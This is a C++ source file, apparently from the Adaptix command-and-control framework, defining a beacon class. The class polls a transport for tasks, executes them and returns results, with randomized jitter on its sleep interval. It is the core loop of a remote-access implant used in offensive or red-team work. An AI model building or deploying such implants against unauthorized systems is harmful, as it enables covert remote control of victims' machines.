#include "adaptix/beacon/beacon.h"

#include <chrono>
#include <iostream>
#include <random>
#include <utility>

namespace adaptix {
namespace beacon {

Beacon::Beacon(std::shared_ptr<BeaconConfig> config,
               std::unique_ptr<Transport> transport,
               std::unique_ptr<CommandExecutor> command_executor)
    : config_(std::move(config)),
      transport_(std::move(transport)),
      command_executor_(std::move(command_executor)),
      is_running_(false),
      random_generator_(std::random_device{}()),
      jitter_distribution_(0, 100) {}

Beacon::~Beacon() {
  Stop();
}

void Beacon::Start() {
  if (is_running_.load()) {
    return;
  }

  if (!config_->Validate()) {
    std::cerr << "Invalid beacon configuration" << std::endl;
    return;
  }

  is_running_.store(true);
  worker_thread_ = std::thread(&Beacon::RunLoop, this);
}

void Beacon::Stop() {
  if (!is_running_.load()) {
    return;
  }

  is_running_.store(false);
  stop_condition_.notify_all();

  if (worker_thread_.joinable()) {
    worker_thread_.join();
  }
}

void Beacon::RunLoop() {
  while (is_running_.load()) {
    std::optional<Task> task = transport_->ReceiveTask();

    if (task.has_value()) {
      TaskResult result = command_executor_->Execute(task.value());
      transport_->SendResult(result);
    }

    std::chrono::milliseconds sleep_duration = CalculateSleepInterval();
    std::unique_lock<std::mutex> lock(mutex_);
    stop_condition_.wait_for(lock, sleep_duration,
                             [this]() { return !is_running_.load(); });
  }
}

std::chrono::milliseconds Beacon::CalculateSleepInterval() {
  auto base_interval = config_->sleep_interval();

  if (config_->jitter_percent() == 0) {
    return base_interval;
  }

  int jitter_value = jitter_distribution_(random_generator_);
  if (jitter_value > config_->jitter_percent()) {
    return base_interval;
  }

  int jitter_multiplier = jitter_distribution_(random_generator_);
  auto jitter_offset = base_interval * jitter_multiplier / 100;

  return base_interval + jitter_offset;
}

}  // namespace beacon
}  // namespace adaptix
